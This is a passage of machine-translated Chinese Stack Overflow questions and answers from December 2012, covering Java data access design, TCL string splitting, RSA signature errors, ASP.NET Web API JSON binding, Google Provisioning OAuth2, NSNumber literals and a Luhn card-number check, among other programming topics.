});​ 
```

[http://jsfiddle.net/oceog/EMPqW/5/](http://jsfiddle.net/oceog/EMPqW/5/)但是，在示例中两者都`$(window).load()`没有`$(document).ready()`使用这个处理程序。

# java - 实现数据访问层抽象

> ID：13870153
> 
> 赞同：4
> 
> 时间：2012-12-13T23:09:00.573
> 
> 标签：java, design-patterns, data-access-layer

这可能是一个教科书问题，但我正在考虑如何设计一些类，将数据库连接从接收查询结果的 RESTful 服务中抽象出来。

我的想法是创建一个数据访问层接口，然后创建一个实现它并包含所有数据库共享的任何操作的顶级类。然后，我将实现这个超类（一个适配器）的具体子类。

对我来说似乎很简单，但我已经反弹的一些人认为它可能更复杂。

对于上下文，这是 Java，两个 DB 是 MySQL 和 HBase。我们已经有了 MySQL 的数据访问层 (DAL) 类。这些不使用休眠或弹簧；他们手动构建数据库查询并根据结果创建 POJO 实例。

所以我想我的问题有两个部分：

> 1）这和我想的一样简单吗？

和

> 2）有更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T12:53:13.683

由于这种问题的情况，答案只能是：视情况而定！

根据您要实现的目标，[这可能是一个复杂的问题](http://en.wikipedia.org/wiki/Object-relational_impedance_mismatch)，也可能是一个更简单的问题。你可以选择像 Hibernate 这样成熟的 ORM 工具，或者使用具有低级 JDBC 结构的自定义基本层。鉴于您拥有的应用程序类型，这对您有用。

但不要忽视这样一个事实，即你想做的基本上是对轮子的重新发明。[以前已经这样做过](http://en.wikipedia.org/wiki/List_of_object-relational_mapping_software#Java)。如果 DAL 工作良好，您应该重用您拥有的 DAL，或者使用现有框架。

此时，您想要的实现只是选择合适的工具的问题。不要只是盲目地选择一个，分析每个优点和缺点，然后选择最适合工作的一个（你的或其他人的）。

# string - 使用 TCL 将以下列表拆分为 4 个元素

> ID：13870157
> 
> 赞同：0
> 
> 时间：2012-12-13T23:09:18.407
> 
> 标签：string, list, split, tcl

如何使用 TCL 将以下列表拆分为 4 个元素

W.1.Agg-251::ethernet17/24 Z.1.Acc-2::ethernet17/1

我尝试如下，但中间的两个元素看起来粘在一起，

设置 c [拆分 $c ::] {\ W.1.Agg-251 {} {ethernet17/24 Z.1.Acc-2} {} ethernet17/1}

更新：

如果我按原样传递列表，下面提供的解决方案确实有效，但是当我将它作为下面的变量传递时，我再次看到中间元素粘在一起。

像这样：

```
 set list2 [lindex $list 0] 
```

o/p==> W.1.Agg-251::ethernet17/24 Z.1.Acc-2::ethernet17/1

```
 set list3 [split [string map {:: :} $list2] ":" ] 
```

o/p==> { W.1.Agg-251} {ethernet17/24 Z.1.Acc-2} ethernet17/1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:34:51.790

split 的第二个参数不是要拆分的字符串，而是一组可用于拆分的字符。请注意以下示例：

```
% split {a::b::c::d} ::
a {} b {} c {} d
% split {a::b::c::d} :
a {} b {} c {} d 
```

您正在尝试做的似乎是拆分“::”和空格。您应该先压缩 :: 序列，然后按如下方式拆分：

```
% split [string map {:: :} {W.1.Agg-251::ethernet17/24 Z.1.Acc-2::ethernet17/1}] ": "
W.1.Agg-251 ethernet17/24 Z.1.Acc-2 ethernet17/1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:14:36.127

你说 4 个元素，但我只看到 3 个元素（两个 :: 对）。您确定 24 和 Z 之间的空格不应该是 :: 吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T14:54:38.513

您需要做的就是将“::”替换为空格“”：

```
set list2 [string map {"::" " "} $list] 
```

核实：

```
foreach token $list2 { puts ">$token<" } 
```

输出：

```
>W.1.Agg-251<
>ethernet17/24<
>Z.1.Acc-2<
>ethernet17/1< 
```

# java - java.security.SignatureException：签名长度不正确：得到 66，但期待 64

> ID：13870158
> 
> 赞同：1
> 
> 时间：2012-12-13T23:09:32.463
> 
> 标签：java, security, rsa, encryption-asymmetric

这就是我生成密钥对的方式：

```
private void generateKeyPair() throws NoSuchAlgorithmException, IOException {
KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
//        kpg.initialize(1024);
kpg.initialize(512);
KeyPair kp = kpg.genKeyPair();

System.out.println("Generated Key Pair");
dumpKeyPair(kp);
} 
```

以下创建令牌和令牌签名：

```
public String makeTokenSignature(String message) throws GeneralSecurityException {
Signature signature = Signature.getInstance("SHA1withRSA");
signature.initSign(getPrivateKey());
signature.update(message.getBytes());

byte[] signatureValue = signature.sign();
return encodeBASE64(signatureValue);
}

public String createTokenString(String userName) {
long currentTime = System.currentTimeMillis();
String tokenString = userName + "some other values..";

return tokenString;
} 
```

这是验证器代码：

```
public boolean isValidTokenSignature(String message, byte[] signatureValue) throws     GeneralSecurityException {
Signature signature2 = Signature.getInstance("SHA1withRSA");
signature2.initVerify(getPublicKey());
signature2.update(message.getBytes());
return signature2.verify(signatureValue);
} 
```

我看到的问题：当 userName.length >= 16 && userName < 18 时，验证代码可以正常工作。有人能告诉我密钥大小如何影响用户名的允许长度吗？当我在 GenerateKeyPair 代码中使用 kpg.initialize(1024) 时，用户名的下限为 18 个字符。

# php - PHP动态链接

> ID：13870160
> 
> 赞同：0
> 
> 时间：2012-12-13T23:09:38.190
> 
> 标签：php, html

我正在使用一个 php 脚本，该脚本从 Google Docs 电子表格中获取信息并将其显示在标题中。我想显示当前正在播出的节目的图像，但我必须考虑文件夹结构以及网站上线后会发生什么。

我尝试了一个固定链接

```
http://localhost:8080/... 
```

这样就可以了，但显然我需要一个网站的动态链接。不幸的是，脚本从它所在的页面读取链接，例如......

PHP 脚本在每个页面上都定义了一个包含：

```
<?php include("widgets/livefeed/onair.php"); ?> 
```

**index.html -> 有效，因为 /djs 文件夹位于主文件夹中**

*另一个文件夹中的另一个页面不起作用，因为它需要 ../ 在链接之前，以便它可以向上一个目录。不幸的是，它开始从页面所在的文件夹中寻找链接。*

```
<img src=\"djs/images/onair/desktop/$image\" width=\"210\" height=\"105\" alt=\"{$build[$i][3]}\" title=\"{$build[$i][3]}\" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T23:34:13.030

在您的索引文件中定义两个变量并在每个包含/要求中使用它们。前任：

```
define('DS', DIRECTORY_SEPARATOR);
define('ROOT', dirname(dirname(__FILE__))); 
```

用法：`include(ROOT . DS . 'widgets/livefeed/onair.php');` 或

```
<img src=\"<?php echo ROOT . DS . "djs/images/onair/desktop/".$image; ?>\" width=\"210\" height=\"105\" alt=\"{$build[$i][3]}\" title=\"{$build[$i][3]}\" /> 
```

# c#-4.0 - 将 JSON 对象发送到 Web API

> ID：13870161
> 
> 赞同：22
> 
> 时间：2012-12-13T23:09:44.383
> 
> 标签：c#-4.0, jquery, asp.net-mvc-4, asp.net-web-api

我试图弄清楚如何将一些信息从表单发送到 Web API 操作。这是我正在尝试使用的 jQuery/AJAX：

```
var source = { 
        'ID': 0, 
        'ProductID': $('#ID').val(), 
        'PartNumber': $('#part-number').val(),
        'VendorID': $('#Vendors').val()
    }

    $.ajax({
        type: "POST",
        dataType: "json",
        url: "/api/PartSourceAPI/",
        data: JSON.stringify({ model: source }),
        success: function (data) {
            alert('success');
        },
        error: function (error) {
            jsonValue = jQuery.parseJSON(error.responseText);
            jError('An error has occurred while saving the new part source: ' + jsonValue, { TimeShown: 3000 });
        }
    }); 
```

这是我的模型

```
public class PartSourceModel
{
    public int ID { get; set; }
    public int ProductID { get; set; }
    public int VendorID { get; set; }
    public string PartNumber { get; set; }
} 
```

这是我的看法

```
<div id="part-sources">
    @foreach (SmallHorse.ProductSource source in Model.Sources)
    {
        @source.ItemNumber <br />
    }
</div>
<label>Part Number</label>
<input type="text" id="part-number" name="part-number" />

<input type="submit" id="save-source" name="save-source" value="Add" /> 
```

这是我的控制器动作

```
// POST api/partsourceapi
public void Post(PartSourceModel model)
{
    // currently no values are being passed into model param
} 
```

我错过了什么？现在，当我在 ajax 请求命中控制器操作时调试并逐步执行此操作时，没有任何内容传递到模型参数中。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-12-14T01:15:38.887

尝试这个：

**jQuery**

```
 $('#save-source').click(function (e) {
        e.preventDefault();
        var source = {
            'ID': 0,
            //'ProductID': $('#ID').val(),
            'PartNumber': $('#part-number').val(),
            //'VendorID': $('#Vendors').val()
        }
        $.ajax({
            type: "POST",
            dataType: "json",
            url: "/api/PartSourceAPI",
            data: source,
            success: function (data) {
                alert(data);
            },
            error: function (error) {
                jsonValue = jQuery.parseJSON(error.responseText);
                //jError('An error has occurred while saving the new part source: ' + jsonValue, { TimeShown: 3000 });
            }
        });
    }); 
```

**控制器**

```
 public string Post(PartSourceModel model)
    {
        return model.PartNumber;
    } 
```

**看法**

```
<label>Part Number</label>
<input type="text" id="part-number" name="part-number" />

<input type="submit" id="save-source" name="save-source" value="Add" /> 
```

`Add`现在，当您在填写文本框后单击“ ”时，将在警报中`controller`吐出您在框中所写的内容。`PartNumber`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-14T00:08:45.700

改变：

```
 data: JSON.stringify({ model: source }) 
```

至：

```
 data: {model: JSON.stringify(source)} 
```

在你的控制器中你这样做：

```
public void PartSourceAPI(string model)
{
       System.Web.Script.Serialization.JavaScriptSerializer js = new System.Web.Script.Serialization.JavaScriptSerializer();

   var result = js.Deserialize<PartSourceModel>(model);
} 
```

如果您在 jquery 中使用的 url 是，`/api/PartSourceAPI`那么控制器名称必须是`api`并且操作（方法）应该是`PartSourceAPI`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-14T13:56:24.630

```
var model = JSON.stringify({ 
    'ID': 0, 
    'ProductID': $('#ID').val(), 
    'PartNumber': $('#part-number').val(),
    'VendorID': $('#Vendors').val()
})

$.ajax({
    type: "POST",
    dataType: "json",
    contentType: "application/json",
    url: "/api/PartSourceAPI/",
    data: model,
    success: function (data) {
        alert('success');
    },
    error: function (error) {
        jsonValue = jQuery.parseJSON(error.responseText);
        jError('An error has occurred while saving the new part source: ' + jsonValue, { TimeShown: 3000 });
    }
});

var model = JSON.stringify({      'ID': 0,     ...': 5,      'PartNumber': 6,     'VendorID': 7 }) // output is "{"ID":0,"ProductID":5,"PartNumber":6,"VendorID":7}" 
```

您的数据是这样的 "{"model": "ID":0,"ProductID":6,"PartNumber":7,"VendorID":8}}" web api 控制器无法将其绑定到您的模型

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2012-12-13T23:15:19.217

我相信您需要以下引号`model`：

```
JSON.stringify({ "model": source }) 
```

# ios - 如何为特定矩形设置地理围栏？

> ID：13870170
> 
> 赞同：0
> 
> 时间：2012-12-13T23:10:47.550
> 
> 标签：ios, xcode

我需要使用坐标为矩形设置特定的地理围栏......如果用户在地理围栏中，我需要调用一个动作。

任何想法都会有很大帮助！我还可以从示例代码或链接到教程或苹果的示例中学习得更好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:23:24.480

我假设当您说“地理围栏”时，您正在谈论[监视基于形状的区域](http://developer.apple.com/library/ios/documentation/userexperience/conceptual/LocationAwarenessPG/CoreLocation/CoreLocation.html#//apple_ref/doc/uid/TP40009497-CH2-SW13)，如*位置感知编程指南中所述。*如果是这样，该文档对其进行了一些描述，并且[Regions](http://developer.apple.com/library/ios/#samplecode/Regions/Introduction/Intro.html#//apple_ref/doc/uid/DTS40010726)示例代码可能对工作演示很有帮助。

# cordova - Sencha Touch 2.1 升级 - 网页应用和移动应用都在 iOS 模拟器上出现白屏

> ID：13870172
> 
> 赞同：3
> 
> 时间：2012-12-13T23:10:51.860
> 
> 标签：cordova, android-emulator, sencha-touch, ios-simulator, sencha-touch-2.1

从 Sencha Touch 2.0 升级到 2.1 后，我在 web 应用程序和移动应用程序中都面临以下问题：

1.  Web 应用程序：在 iPhone 浏览器上打开 Web 应用程序后，如果我单击图标将其添加到主屏幕并从该图标运行它，它会给出一个白色的空白屏幕。如果我使用浏览器上的 url 打开它，该应用程序可以正常工作。如果我使用它的主屏幕图标打开它，则无法找出网络应用程序可能出现的问题。

2.  iPhone 应用程序：我将 phonegap 用于 web 应用程序的 android 和 ios 版本。Android 移动应用在 Android 手机或模拟器上运行良好。但是，iOS 应用程序在启动屏幕后仅显示白色空白屏幕。

非常感谢您对此的任何帮助。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-06T10:44:15.523

正如 Lukas 所说，这是**Sencha Touch v2.1.0**版本的问题，在当前**v2.1.1**版本中已解决。我刚刚在更新后测试了我的应用程序，现在一切正常。你只需要更新 SDK 文件。

这是一个关于问题的线程：[http ://www.sencha.com/forum/showthread.php?249335-White-SCREEN-OF-DEATH-on-launch-with-ST-2.1/page4](http://www.sencha.com/forum/showthread.php?249335-White-SCREEN-OF-DEATH-on-launch-with-ST-2.1/page4)

Sencha Touch 新版下载链接：[http ://www.sencha.com/products/touch/download/sencha-touch-2.1.1/](http://www.sencha.com/products/touch/download/sencha-touch-2.1.1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T08:37:04.810

白屏是2.1中“sencha-touch-all-debug.js”文件的问题

它将在接下来的几天内的下一个版本中修复。（[http://www.sencha.com/forum/showthread.php?249335-White-SCREEN-OF-DEATH-on-launch-with-ST-2.1](http://www.sencha.com/forum/showthread.php?249335-White-SCREEN-OF-DEATH-on-launch-with-ST-2.1)）

一种解决方法是删除“sencha-touch-all-debug.js”文件中以“Ext.device”开头的所有类。

例如：`Ext.define('Ext.device.communicator.Default',{...});`

# .net - 无法在 DebugAnalyzer 中分析转储文件

> ID：13870175
> 
> 赞同：2
> 
> 时间：2012-12-13T23:11:20.373
> 
> 标签：.net, debugging, windbg, memory-dump

我有一个来自 64 位机器的 64 位 w3wp 进程的内存转储。当我在 WinDbg 中打开它并用 psscor 或 sos 分析它时，它工作正常。

但是，我正在尝试使用[DebugAnalyzer](http://www.debuganalyzer.net/)工具。当我打开它并点击“运行分析！” 按钮，这是我在对话框中看到的错误消息：

```
---------------------------
Debug Analyzer.NET v2
---------------------------
Unable to detect .NET Runtime (CLR) or Unsupported version
(Hint: Error loading symbol for mscorwks.dll or CLR 1.x)

Verify the following:
- Check if Symbol Path is correct
- You are debugging on the same architecture
  (eg. x86 dump require x86 version of Debug Analyzer) 
```

符号路径是正确的（与 WinDbg 使用的相同）并且我使用的是 64 位版本的 DebugAnalyzer。w3wp 进程使用的 .NET 版本是 .NET 4。

我在我的机器上找不到`mscorwks.dll`任何地方，但`mscordacwks.dll`在我的符号路径中。但是，由于 WinDBG 似乎不需要它，我不确定这是否是问题所在。

是否有人有使用此工具的经验或建议的故障排除步骤？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T20:07:00.523

感谢您使用调试分析器。可供下载的版本仅支持 .NET v2.0 内存转储。我相信您正在测试已加载 .NET 4.0 的内存转储。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T14:26:08.110

消息`Unable to detect .NET Runtime (CLR) or Unsupported version`似乎说明了一切。我会在其他 .NET 4.0 应用程序上尝试 Debug Analyzer.NET v2，看看它是否有效。另一条感兴趣的线是`You are debugging on the same architecture`. 您的 w3wp.exe 是 32 位还是 64 位进程？您使用的是相应版本的 Debug Analyzer.NET 吗？

# python - 在 Flask-MongoAlchemy 中创建动态文档

> ID：13870178
> 
> 赞同：2
> 
> 时间：2012-12-13T23:11:29.560
> 
> 标签：python, flask, mongoalchemy

我将 Flask-MongoAlchemy 用于个人项目。我有一些 .cfg 输入文件，我想解析并制作成 mongodb 文档条目。不幸的是，.cfg 文件是扁平的，我想从每个文件中制作多个不同的文档。我想定义我想在一个地方使用的结构（在一个单独的 .cfg 文件中）和 1）在解析输入文件时将其转换为这种格式，以及 2）使用这种结构创建 MongoAlchemy 文档类。我只遇到了#2 的问题，但我对解决这两个目标的替代实现持开放态度。

这是我的输入 .cfg 文件。我想把它做成多个 mongodb 文档。

```
[foo]
a = val1
b = val2
c = val3
d = val4 
```

这是定义结构的documents.cfg。这些值是用于区分类型的数字。

```
[foo]
    [[bar]]
    a = 1
    b = 1
    [[baz]]
    c = 2
    d = 1 
```

这是类定义

```
class Bar(db.Document):
    # add class attributes from kwargs
    @classmethod
    def init(cls, **kwargs):
        for k, v in kwargs.items():
            if v == 1:
                setattr(cls, k, db.IntField(min_value=0))

class Baz(db.Document):
    # add class attributes from kwargs
    @classmethod
    def init(cls, **kwargs):
        for k, v in kwargs.items():
            if v == 1:
                setattr(cls, k, db.IntField(min_value=0))
            elif v == 2:
                setattr(cls, k, db.StringField()) 
```

我解析documents.cfg 以创建两个字典：

```
bar_dict = {'a': '1', 'b': '1'}
baz_dict = {'c': '2', 'd': '1'} 
```

然后我将这些传递给相应的 init() 方法

```
Bar.init(**bar_dict)
Baz.init(**baz_dict) 
```

这成功地添加了属性。但是，在创建 Bar（或 Baz）的实例时，我收到此错误。

```
mongoalchemy.exceptions.ExtraValueException: a 
```

我的猜测是，这与 MongoAlchemy 字段应该是类属性而不是实例属性有关。有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-03T15:38:29.503

```
class Bar(db.Document):
    config_extra_fields = 'ignore'
    ...

class Baz(db.Document):
    config_extra_fields = 'ignore'
    ... 
```

# tfs - tfsbuild - TFS 构建定义 - 要部署的默认 Web 应用程序

> ID：13870182
> 
> 赞同：2
> 
> 时间：2012-12-13T23:11:46.177
> 
> 标签：tfs, msbuild, tfsbuild, msbuild-4.0, build-server

我有两个 MVC 3 Web 项目，一个用于移动应用程序，另一个是常规桌面 Web 应用程序，最后添加的是移动应用程序，我有一个构建定义，每次签入代码时都会部署（门控签入）。

我的问题是，由于我添加了移动设备，因此构建定义将该项目作为默认项目，所以我想知道在这种情况下是否可以指定“默认 Web 项目”，我想改为部署桌面版本手机。

我想知道是否可以从构建参数中指定，配置如下：

/p:Configuration=Dev /p:Platform="Any CPU" /p:DeployOnBuild=true /p:DeployTarget=MSDeployPublish /p:MSDeployPublishMethod=WMSVC /p:MsDeployServiceUrl=https://IP:Port/msdeploy.axd / p:username=xxx /p:password=xxx /p:AllowUntrustedCertificate=True /p:DeployIisAppPath=Path

在“要构建的项目”选项中，我有项目的解决方案（sln 文件）

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:00:42.807

不要将其他属性添加到 MSBuild 命令行，而是编辑项目文件并在项目文件中设置属性。如果需要，创建一个特定的配置来放置它们，这样部署就不会总是发生在 Visual Studio 中。

```
 <PropertyGroup Condition="'$(BuildingInsideVisualStudio)' == false">
      <DeployOnBuild>true</DeployOnBuild>
      <MSDeployTarget>MSDeployPublish</MSDeployTarget>
      ....
      ....
 </PropertyGroup> 
```

这样项目文件就会知道何时部署。如果需要，您可以将这些项目粘贴到已经存在的 Dev|AnyCPU PropertyGroup 中，但这样它总是会在 Visual Studio 中构建。

为了能够通过命令行触发部署，您必须确保每个项目都侦听自己的命令行参数。

```
 <PropertyGroup Condition="'$(BuildingInsideVisualStudio)' == false">
      <DeployOnBuild Condition="'$(DeployDefaultWebsiteOnBuild)' == 'true'>true</DeployOnBuild>
      <MSDeployTarget>MSDeployPublish</MSDeployTarget>
      ....
      ....
 </PropertyGroup> 
```

如您所见，我已向 DeployOnBuild 添加了一个条件，如果 DeployDefaultWebsiteOnBuild 设置为 true，则该条件将其设置为 true。现在您可以从命令行设置该属性。

```
 /p:DeployDefaultWebsiteOnBuild=true 
```

# python - 使用 Python 在 Google App Engine 中使用 Google Provisioning API 和 oAuth2

> ID：13870185
> 
> 赞同：1
> 
> 时间：2012-12-13T23:12:27.970
> 
> 标签：python, google-app-engine, oauth, google-api, google-provisioning-api

好的，我正在尝试使用 Google 的配置 API 在后台将成员添加到 google 组，因为他们在 google course builder 中注册/注册（由 google 应用程序引擎提供支持）。

我尝试的第一种方法是使用此处显示的 clientLogin 方法：[https ://developers.google.com/google-apps/provisioning/#adding_a_member_to_a_group](https://developers.google.com/google-apps/provisioning/#adding_a_member_to_a_group)

```
groupClient = gdata.apps.groups.client.GroupsProvisioningClient(domain=domain)
groupClient.ClientLogin(email=email, password=password, source='apps')
groupClient.AddMemberToGroup(group_id, member_id) 
```

尽管这在 App Engine 之外有效，但在实施后我遇到了一些错误并被告知（http://stackoverflow.com/questions/13867535/python-import-gdata-google-apps-engine-course-builder）使用它在 App Engine 中是一个坏主意，因为它已被弃用。

我现在正在尝试使用此处找到的 python 配置 oAuth 示例来完成此操作 (https://developers.google.com/google-apps/help/libraries-samples#provisioningv2)

这是来源：

```
"""Sample for the Provisioning API and the Email Settings API with OAuth 2.0."""

__author__ = 'Shraddha Gupta <shraddhag@google.com>'

from optparse import OptionParser
import gdata.apps
import gdata.apps.emailsettings.client
import gdata.apps.groups.client
import gdata.client
import gdata.gauth
import httplib

API_VERSION = '2.0'
BASE_URL = '/a/feeds/group/%s' % API_VERSION
SCOPE = ('https://apps-apis.google.com/a/feeds/groups/')
HOST = 'apps-apis.google.com'

class OAuth2ClientSample(object):
"""OAuth2ClientSample object demos the use of OAuth2Token for retrieving
Members of a Group and updating Email Settings for them."""

def __init__(self, domain, client_id, client_secret):
"""
Args:
  domain: string Domain name (e.g. domain.com)
  client_id: string Client_id of domain admin account.
  client_secret: string Client_secret of domain admin account.
"""
try:
  self.token = gdata.gauth.OAuth2Token(client_id=client_id,
                                       client_secret=client_secret,
                                       scope=SCOPE,
                                       user_agent='oauth2-provisioningv2')
  self.uri = self.token.generate_authorize_url()
  #print 'Please visit this URL to authorize the application:'
  #print self.uri
  # Get the verification code from the standard input.
  #code = raw_input('What is the verification code? ').strip()
  conn = httplib.HTTPConnection(self.uri)
  conn.request("GET")
  r1 = conn.getresponse()
  print r1.read()
  self.token.get_access_token(code)
  except gdata.gauth.OAuth2AccessTokenError, e:
  print 'Invalid Access token, Check your credentials %s' % e
  exit(0)
  self.domain = domain
  self.baseuri = '%s/%s' % (BASE_URL, domain)
  self.client = gdata.apps.groups.client.GroupsProvisioningClient(
    domain=self.domain, auth_token=self.token)
# Authorize the client. 
# This will add the Authorization header to all future requests.
self.token.authorize(self.client)
self.email_client = gdata.apps.emailsettings.client.EmailSettingsClient(
    domain=self.domain, auth_token=self.token)
self.token.authorize(self.email_client)

def create_filter(self, feed):
"""Creates a mail filter that marks as read all messages not containing
Domain name as one of their words for each member of the group.

Args:
  feed: GroupMemberFeed members whose emailsettings need to updated
"""
for entry in feed.entry:
  user_name, domain = entry.member_id.split('@', 1)
  if entry.member_type == 'User' and domain == self.domain:
    print 'creating filter for %s' % entry.member_id
    self.email_client.CreateFilter(user_name,
                                   does_not_have_the_word=self.domain,
                                   mark_as_read=True)
  elif entry.member_type == 'User':
    print 'User belongs to other Domain %s' %entry.member_id
  else:
    print 'Member is a group %s' %entry.member_id

def run(self, group):
feed = self.client.RetrieveAllMembers(group)
self.create_filter(feed)

def main():

  sample = OAuth2ClientSample('mydomain.mygbiz.com',
  'mydomain', 'My client secret')
  sample.run('test')

if __name__ == '__main__':
  main() 
```

我意识到这只是要列出我组的成员，但现在我只是试图通过身份验证阶段。

我具体提到的代码是：

```
 #print 'Please visit this URL to authorize the application:'
  #print self.uri
  # Get the verification code from the standard input.
  #code = raw_input('What is the verification code? ').strip()
  conn = httplib.HTTPConnection(self.uri)
  conn.request("GET")
  r1 = conn.getresponse()
  print r1.read()
  self.token.get_access_token(code) 
```

我注释掉了原始代码，该代码采用原始输入作为令牌。这需要在后台无缝运行，因此我需要它自动检索令牌。我已经开始使用 httplib，但它返回的 URL 错误。

我有一些问题。

**首先**，这是我需要做的最简单的方法吗，这似乎有点矫枉过正。clientLogin，更加优雅和简单。

**其次**，如果我必须这样做，一旦我拥有验证 URL，我该如何检索令牌？我使用httplib吗？

我正在*认真*考虑在 Python 中模拟浏览器……为什么这个过程如此复杂？

***非常感谢提供的任何帮助。***

编辑：我只是想指出，首先做所有这些的原因是为了开发一个[MOOC](http://en.wikipedia.org/wiki/Massive_open_online_course)课程构建器，它可能拥有数万到数十万的成员。讨论平台将是google groups，但我们不能向公众开放，也不能手动批准每个成员。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T21:13:10.590

您可以继续使用 ClientLogin，弃用过程缓慢（https://developers.google.com/accounts/terms）。我将 Oauth 2 用于我的应用程序，但我不使用应用程序引擎。您可以从项目的 API 控制台页面 (https://code.google.com/apis/console) 下载 client_secrets.json 文件，并从文件中检索密钥等。例如：

```
import oauth2client.client
import oauth2client.file
import oauth2client.tools
...
oauth2_flow = oauth2client.client.flow_from_clientsecrets('client_secrets.json',
  scope='list of scopes',message='Missing client_secrets.json file message')
storage = oauth2client.file.Storage('creedentials.ouath2')
oauth2_credentials = storage.get()
if oauth2_credentials is None or oauth2_credentials.invalid:
  oauth2_credentials = oauth2client.tools.run(oauth2_flow, storage)
... 
```

# objective-c - 为什么 NSNumber 字面量不能用于静态声明

> ID：13870188
> 
> 赞同：7
> 
> 时间：2012-12-13T23:12:31.153
> 
> 标签：objective-c, ios, static, ios6, nsnumber

我声明：

```
static NSString *a = @"a"; 
```

这是iOS6中的正确声明（使用编译器版本应该更正确，但我目前不知道）。我认为数字文字也：

```
static NSNumber *b=@1; 
```

可能是一个有效的声明。编译器告诉我`initializer element is not a compile time constant`。这让我有点吃惊。由于`NSNumber`是不可变的`NSString`，因为我使用的是字符串大小写的文字，我认为它也可能是有效的。

有人对这种差异有合理的解释吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-14T02:03:16.753

第一行是编译时常量，因为您正在分配`@"a"`而不是类似的东西`static NSString *a = [NSString stringWithFormat:@"a"];`（这将引发相同的错误）

但对于一个`NSNumber`，`static NSNumber *b = @1;`其实就等价于`static NSNumber *b = [NSNumber numberWithInt:1];`。有关更多详细信息，[请查看 Objective-C 文字。](http://clang.llvm.org/docs/ObjectiveCLiterals.html)

请注意，在上述情况下，右侧不是编译时常量。它是一个必须在运行时计算的表达式。在 C 和 Objective-C 中，静态变量必须使用编译时常量进行初始化。

如果你想`NSNumber`作为一个`const`你可以检查这里提到的方法[Objective C - How to use extern variables？](https://stackoverflow.com/questions/4360327/objective-c-how-to-use-extern-variables).

还要[检查来自 Mike Ash 的 Objective C 文字](http://www.mikeash.com/pyblog/friday-qa-2012-06-22-objective-c-literals.html)，

> 重要的是要注意，新的文字语法都不能作为编译时常量。

和，

> 由于编译器和库之间的紧密耦合，NSString 文字也是编译时常量。有一个名为 NSConstantString 的特殊 NSString 子类，具有固定的 ivar 布局：
> 
> 这种紧密耦合具有优势，例如生成合法的全局变量初始化器，并且不需要额外的代码来运行以在运行时构建对象。但是，也有很大的缺点。NSConstantString 布局是永久设置的。该类必须完全使用该数据布局来维护，因为该数据布局已融入数千个第三方应用程序。如果 Apple 更改布局，那些第三方应用程序就会崩溃，因为它们包含具有旧布局的 NSConstantString 对象。
> 
> 如果 NSArray 字面量是编译时常量，则需要有一个类似的 NSConstantArray 类，它具有编译器可以生成的固定布局，并且必须与其他 NSArray 实现分开维护。这样的代码不能在没有这个 NSConstantArray 类的旧操作系统上运行。新文字可以产生的其他类也存在同样的问题。
> 
> *这在 NSNumber 文字的情况下特别有趣。Lion 引入了标记指针，它允许将 NSNumber 的内容直接嵌入到指针中，从而无需单独的动态分配对象。如果编译器发出标记指针，它们的格式永远不会改变，并且与旧操作系统版本的兼容性将丢失。如果编译器发出常量 NSNumber 对象，那么 NSNumber 文字将与其他 NSNumber 有很大不同，可能会对性能造成重大影响。*
> 
> *相反，编译器只是简单地向框架发出调用，完全像您手动完成的那样构造对象。这会导致一些运行时问题，但并不比在没有新语法的情况下自己构建它们更糟糕，并且使设计更加简洁。*

# java - 如何将一个数字中的两个整数相加

> ID：13870191
> 
> 赞同：1
> 
> 时间：2012-12-13T23:12:46.577
> 
> 标签：java, numbers

我正在编写一个信用卡验证程序。我正在尝试查看产品是否超过 1 位长（即：10），如果是，我需要将两个整数相加。例如 10 将`1 + 0`等于 1，我该怎么做？

这是我到目前为止所拥有的：

```
public class CreditCard{
public static void main(String args[]){

    //Take in a 16 digit credit card number
    Scanner in=new Scanner (System.in);
    int num[]=new int[16];
    int i=0;

    for (i=0;i<num.length;i++) {
        System.out.println("Please enter a 16 digit credit card number");
        num[i]=in.nextInt();

    }
    if (num.length < 16 || num.length > 16)
        {
            System.out.println("Invalid");
        }
     else
    {

        //multiply every other number by 2, starting with place 16, and find the sum(sum1)
         int num1 = (num[16] * 2);
         int num2 = (num[14] * 2);
         int num3 = (num[12] * 2);
         int num4 = (num[10] * 2);
         int num5 = (num[8] * 2);
         int num6 = (num[6] * 2);
         int num7 = (num[4] * 2);
         int num8 = (num[2] * 2);

         if( num1 > 9)

         int sum1 = (num[16] * 2) + (num[14] * 2) + (num[12] * 2) + (num[10] * 2) + (num[8] * 2) + (num[6] * 2) + (num[4] *2) + (num[2] *2);
         int sum2 = (num[15] + num[13] + num[11] + num[9] + num[7] + num[5] + num[3] + num[1]);

        int totalSum = sum1 + sum2;
        if (totalSum % 10 != 0)
        {
            System.out.println("Invalid card number!!");
        }
        else

        {  
            System.out.println(" Valid Credit Card Number!!");

        }

      }      
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:23:58.740

与其重新发明轮子，不如看看[Luhn 算法](http://en.wikipedia.org/wiki/Luhn_algorithm)，这是一种广泛使用的校验和算法，用于验证信用卡号码。这是一个[Java 版本](http://rosettacode.org/wiki/Luhn_test_of_credit_card_numbers#Java)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T23:25:29.563

看起来您正在尝试实现[Luhn checkdigit algorithm](http://en.wikipedia.org/wiki/Luhn_algorithm)。

